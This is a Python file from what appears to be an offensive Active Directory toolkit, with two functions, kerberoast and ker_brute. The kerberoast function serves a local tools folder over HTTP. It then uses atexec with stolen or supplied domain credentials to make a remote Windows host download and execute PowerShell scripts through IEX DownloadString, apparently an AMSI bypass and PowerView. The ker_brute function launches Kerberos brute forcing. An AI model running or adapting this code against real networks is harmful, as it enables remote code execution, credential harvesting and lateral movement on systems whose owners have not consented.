from bin import atexec
from bin import kerbrute
from datetime import datetime, date
import time
import os,sys

def time_stamp():
	today = date.today()
	now = datetime.now()
	timestamp = today.strftime('%d %B %Y {}').format(now.strftime("%H:%M:%S"))
	return timestamp

def kerberoast(domain,user,passw,target,localip,localport,host):
	print('->[+] Performing Kerberoasting')
	os.system('timeout 5 python3 -m http.server %s --directory ./tools/ > /dev/null 2>&1 &' % localport)
	timestamp = time_stamp()
	atexec.main('%s/%s:%s@%s' % (domain,user,passw,target),'powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString(\'http://%s:%s/am.txt\');IEX(New-Object Net.WebClient).DownloadString(\'http://%s:%s/pv.ps1\');Invoke-Aaa"' % (localip,localport,localip,localport), '%s - Kerberoasting Performed From %s' % (timestamp,host))
	time.sleep(5)

def ker_brute(domain,user,passw,target,localip,host):
	print('->[+] Performing Kerbrute')
	timestamp = time_stamp()
	atexec.main('%s/%s:%s@%s' % (domain,user,passw,target),'echo Results:','%s - Kerbrute Performed From %s Against %s' % (timestamp,localip,host))
	kerbrute.startkerbrute(domain,target)
